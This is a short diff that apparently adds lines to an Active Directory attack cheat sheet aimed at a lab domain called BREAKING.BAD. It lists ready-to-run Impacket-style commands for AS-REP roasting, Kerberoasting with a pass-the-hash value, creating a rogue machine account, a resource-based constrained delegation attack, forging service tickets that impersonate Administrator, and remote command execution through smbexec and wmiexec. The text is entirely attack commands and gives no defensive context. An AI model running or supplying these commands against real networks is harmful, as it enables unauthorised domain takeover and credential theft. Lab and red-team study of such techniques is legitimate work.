@@ -130,3 +130,9 @@ GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes :
 GetUserSPNs.py -outputfile Kerberoastables.txt BREAKING.BAD/anonymous:anonymous
 GetUserSPNs.py -outputfile Kerberoastables.txt -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator
 polenum -u anonymous -p anonymous -d BREAKING.BAD
+addcomputer.py -computer-name 'SHUTDOWN$' -computer-pass '123soleil!' -dc-host DC01 -domain-netbios BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
+rbcd-attack -f SHUTDOWN -t SV01 -dc-ip DC01.BREAKING.BAD 'BREAKING.BAD\anonymous:anonymous'
+smbexec.py -share 'ADMIN$' -k SV01.BREAKING.BAD
+wmiexec.py -k SV01.BREAKING.BAD
+getST.py -spn CIFS/SV01@BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
+getST.py -spn RPCSS/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 'BREAKING.BAD/SHUTDOWN$:123soleil'
